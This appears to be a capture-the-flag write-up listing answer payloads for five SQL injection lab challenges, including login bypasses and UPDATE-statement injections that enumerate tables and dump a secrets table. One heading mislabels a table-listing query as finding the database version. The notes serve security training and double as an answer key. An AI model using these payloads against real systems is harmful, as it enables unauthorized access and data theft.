## Taks 1 
### SQL Injection 1: Input Box Non-String
* Answer : `1 or 1=1-- - `

### SQL Injection 2: Input Box String
* **Description** : *This challenge uses the same query as in the previous challenge. However, the parameter expects a string instead of an integer, as can be seen here:*
* Answer : `1' or '1'='1'-- -`
### SQL Injection 3 URL : 
* **Description** : *Here, the SQL query is the same as the previous one:* `SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'`
* Answer : `' or 1=1-- -`
### SQL injection ; 4 POST :
* **Description** : *When submitting the login form for this challenge, it uses the HTTP POST method. It is possible to either remove/disable the JavaScript validating the login form or submit a valid request and intercept it with a proxy tool such as Burp Suite and modify it:*
* Answer : `1' or 1=1--`
### SQL Injection 5: UPDATE Statement
* **Description** :* Log in to the "SQL Injection 5: UPDATE Statement" challenge and exploit the vulnerable profile page to find the flag. The credentials that can be used are:*
* profileID: `10`
* password:`toor`
* **FInd Database Version** : `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='`
* **Final payload to find FLAG** : `',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email=''`
